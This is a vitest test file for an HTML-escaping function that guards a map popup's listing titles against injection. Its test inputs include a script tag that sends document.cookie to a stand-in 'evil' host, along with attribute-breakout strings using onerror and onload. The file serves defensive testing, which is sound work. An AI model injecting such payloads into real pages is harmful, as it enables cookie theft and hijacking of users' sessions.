import { describe, expect, it } from "vitest";
import { escapeHtml } from "@/lib/html";

/**
 * The map popup's escaping.
 *
 * This is the one place in VELTO where text a media owner typed becomes HTML
 * without React in between: maplibre's Popup takes a string, so the listing
 * title and city are concatenated into markup by hand.
 *
 * It is tested here, rather than left as a private helper inside MapView,
 * because MapView imports maplibre-gl and vitest runs with no jsdom - so a
 * security control living there could never be exercised, and would break
 * silently. It is also the reason the maplibre sanitizer advisory in TODO.md
 * is not reachable in this codebase: nothing dangerous survives this function
 * to reach the library at all.
 */
describe("escapeHtml", () => {
  it("neutralises a script tag in a listing title", () => {
    const attack = '<script>fetch("//evil/?c="+document.cookie)</script>';
    const escaped = escapeHtml(attack);

    expect(escaped).not.toContain("<script");
    expect(escaped).not.toContain("</script");
    expect(escaped).toContain("&lt;script&gt;");
  });

  it("closes the attribute-breakout routes, not just angle brackets", () => {
    // The popup interpolates into attributes as well as text, so a quote is as
    // dangerous as a bracket: `" onerror="alert(1)` needs no `<` at all.
    expect(escapeHtml('" onerror="alert(1)')).toBe("&quot; onerror=&quot;alert(1)");
    expect(escapeHtml("' onload='x")).toBe("&#39; onload=&#39;x");
  });

  it("escapes the ampersand first, so nothing is double-decoded back", () => {
    // If & were escaped last, "&lt;" produced from "<" would become "&amp;lt;"
    // - and, worse, an input of "&lt;script&gt;" would survive as live markup
    // through one round of decoding.
    expect(escapeHtml("&lt;script&gt;")).toBe("&amp;lt;script&amp;gt;");
    expect(escapeHtml("a & b")).toBe("a &amp; b");
  });

  it("leaves ordinary Hebrew listing titles untouched", () => {
    // The control has to be invisible in the normal case, or someone will
    // remove it for mangling real titles.
    const title = "שלט חוצות — כניסה לעיר, דרך חברון";
    expect(escapeHtml(title)).toBe(title);
  });
});
